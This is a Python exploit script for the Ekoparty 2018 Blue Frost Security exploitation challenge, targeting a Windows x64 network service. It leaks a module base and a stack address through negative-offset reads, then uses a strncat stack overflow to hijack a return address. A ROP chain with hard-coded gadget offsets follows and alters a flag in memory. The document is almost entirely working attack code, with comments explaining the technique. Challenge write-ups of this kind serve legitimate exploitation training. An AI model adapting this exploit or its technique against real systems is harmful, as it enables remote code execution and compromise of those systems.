#!/usr/bin/python
# bfs-ekoparty-2018-exploitation-challenge
# Win7, 8, 10 x64 exploit
# @straight_blast ; straightblast426@gmail.com

import socket
import struct
import sys

global host
host = '127.0.0.1'
port = 41414

p32 = lambda x: struct.pack('<i', x)
p64 = lambda x: struct.pack('<Q', x)
u64 = lambda x: struct.unpack('<Q', x)[0]

def establish_connection():
   s = socket.create_connection((host, port))
   f = s.makefile('rw', bufsize=0)
   f.write("Hello")
   f.read(2)
   return f


def overwrite(rsp_lift, rop):
    f = establish_connection() 
    operation = p32(0x22222222)
    # strncat(.,.,size_t num) ; num = 31. this will fit our choosen 8 bytes from user input
    # into operation_0x22222222's frame 1's RET address on the stack
    level_count = p32(31) 
    # the 2nd recursive stack frame of operation_0x22222222's "if do strncat" flag will have
    # the "ok" written to it, so that particular code path gets trigger.
    # the strncat will use the dest + offset as the destination, which will overwrite the 
    # 1st recursive stack frame of operation_0x11111111, so when that stack frame unwinds to
    # to return, it will jump to arbitrary address
    offset = p32(-112) 
    payload = 'A' * 22 + rsp_lift + 'B' * 26 + rop
    size = len(payload)
    data = p32(size) + operation + level_count + offset
    f.write(data)
    f.write(payload)
    f.read(size)

def leak_address(type):
    f = establish_connection()
    size = 32
    the_size = p32(size)
    operation = p32(0x11111111)
    level_count = p32(8)
    offset = 0
    if type == 'bfs_eko18':
       offset = p32(-88) # offset -88 points to the address after the call operation 0x11111111
    elif type == 'bfs_stack':
       offset = p32(-72) # offset -72 points to the stack address of our input buffer
    data = the_size + operation + level_count + offset
    f.write(data)
    data = 'A' * size
    f.write(data)
    output = f.read(size)

    # the following algorithm will identified the proper address format
    # this is done by sorting the bytes in our leaked dump
    dump = output[11:]
    bytez = {}
    for byte in dump:
       if byte in bytez:
           bytez[byte] += 1
       else:
           bytez[byte] = 1
    sorted_bytez_tuple = sorted(bytez.items(), key = lambda x: x[1], reverse=True)
    leaked_address = ''.join([byte_tuple[0] for  byte_tuple in sorted_bytez_tuple])
    leaked_address = leaked_address + '\0' * (8 - len(leaked_address))
    return u64(leaked_address)
    

if __name__ == '__main__':
    
    if len(sys.argv) < 2 or len(sys.argv) > 2:
       print "Usage: %s <target IP address>" % sys.argv[0]
       sys.exit(-1)
    else:
       host = sys.argv[1]

    leaked_bfs_addr = leak_address('bfs_eko18')
    leaked_stack_addr = leak_address('bfs_stack')

    base_addr = leaked_bfs_addr - 0x1400013F2
    flag_addr = base_addr + 0x14000D090

    # pop rax ; ret
    pop_rax = base_addr + 0x14000114B
    # pop rsp ; ret
    pop_rsp = base_addr + 0x1400032AB
    # add rsp, 0x88 ; ret
    add_rsp_88 = base_addr + 0x140002DBE
    #dec [rax + 0x3b]; ret
    dec_DER_rax_plus_0x3b_DER = base_addr + 0x1400095F3

    rop_chain  = p64(pop_rax) 
    rop_chain += p64(flag_addr - 0x3B)
    rop_chain += p64(dec_DER_rax_plus_0x3b_DER)
    rop_chain += p64(pop_rsp)
    rop_chain += p64(leaked_stack_addr + 0x218)
    
    overwrite(p64(add_rsp_88), rop_chain)
